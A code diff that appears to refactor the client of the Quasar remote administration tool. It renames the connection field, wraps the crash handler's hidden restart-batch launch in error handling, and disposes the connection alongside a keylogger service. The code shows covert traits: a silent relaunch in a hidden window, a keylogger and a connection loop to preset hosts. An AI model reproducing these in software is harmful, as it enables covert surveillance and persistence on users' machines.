@@ -29,7 +29,7 @@ namespace Quasar.Client
         /// <summary>
         /// The client used for the connection to the server.
         /// </summary>
-        public QuasarClient ConnectClient;
+        private QuasarClient _connectClient;
 
         /// <summary>
         /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
@@ -110,13 +110,13 @@ namespace Quasar.Client
                 }
 
                 var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
-                ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
-                InitializeMessageProcessors(ConnectClient);
+                _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
+                InitializeMessageProcessors(_connectClient);
 
-                _userActivityDetection = new ActivityDetection(ConnectClient);
+                _userActivityDetection = new ActivityDetection(_connectClient);
                 _userActivityDetection.Start();
 
-                ConnectClient.ConnectLoop();
+                _connectClient.ConnectLoop();
             }
         }
 
@@ -130,17 +130,26 @@ namespace Quasar.Client
             if (e.IsTerminating)
             {
                 Debug.WriteLine(e);
-                string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
-                if (string.IsNullOrEmpty(batchFile)) return;
-
-                ProcessStartInfo startInfo = new ProcessStartInfo
+                try
                 {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = true,
-                    FileName = batchFile
-                };
-                Process.Start(startInfo);
-                Environment.Exit(0);
+                    string batchFile = BatchFile.CreateRestartBatch(Application.ExecutablePath);
+
+                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = true,
+                        FileName = batchFile
+                    };
+                    Process.Start(startInfo);
+                }
+                catch (Exception exception)
+                {
+                    Debug.WriteLine(exception);
+                }
+                finally
+                {
+                    Environment.Exit(0);
+                }
             }
         }
 
@@ -204,6 +213,7 @@ namespace Quasar.Client
                 _keyloggerService?.Dispose();
                 _userActivityDetection?.Dispose();
                 ApplicationMutex.Dispose();
+                _connectClient.Dispose();
             }
         }
     }
